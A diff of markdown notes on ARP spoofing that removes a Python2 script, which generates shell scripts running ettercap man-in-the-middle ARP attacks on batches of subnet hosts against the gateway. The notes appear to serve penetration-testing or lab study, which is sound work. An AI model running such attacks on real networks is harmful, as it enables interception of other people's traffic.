@@ -187,57 +187,6 @@ echo "1" > /proc/sys/net/ipv4/ip_forward
 ```
 
 ### Python scripts to generate script arp spoof script
-
-Python2
-<details>
-<summary> Click me for the script</summary>
-
-```python=
-#python2
-
-import sys
-
-if not (len(sys.argv) == 6 or len(sys.argv) == 7):
-    print 'usage: ' + sys.argv[0] + ' hostsFile outputScript gatewayIP simultaneousHosts timeoutMinutes always-attack-ips'
-    sys.exit(1)
-
-hostsFile = sys.argv[1]
-outputScript = sys.argv[2]
-gatewayIP = sys.argv[3]
-simultaneousHosts = int(sys.argv[4])
-timeout = sys.argv[5]
-if len(sys.argv) == 7:
-    always = sys.argv[6].split(',')
-    always = [x.strip() for x in always]
-    always = [x.split('.')[3] for x in always]
-    simultaneousHosts -= len(always)
-else:
-    always = []
-
-fInput = open(hostsFile, 'r')
-hosts = fInput.readlines()
-fInput.close()
-hosts = [x.strip() for x in hosts]
-hosts = [x for x in hosts if x != '']
-
-subnetPrefix = '.'.join(hosts[0].split('.')[0:3]) + '.'
-
-hosts = [x.split('.')[3] for x in hosts]
-hosts = [x for x in hosts if not (x in always)]
-groups = [hosts[i:i + simultaneousHosts] for i in range(0, len(hosts), simultaneousHosts)]
-
-fOutput = open(outputScript, 'w')
-
-for g in groups:
-    fOutput.write('timeout -s 2 ' + timeout + 'm ettercap -Tq -S -M arp:remote -o -i eth0 /' + subnetPrefix + ','.join(always+g) + '// /' + gatewayIP + '//\n')
-
-fOutput.close()
-```
-
-</details>
-
-<br>
-
 Python3
 <details>
 <summary> Click me for the script</summary>
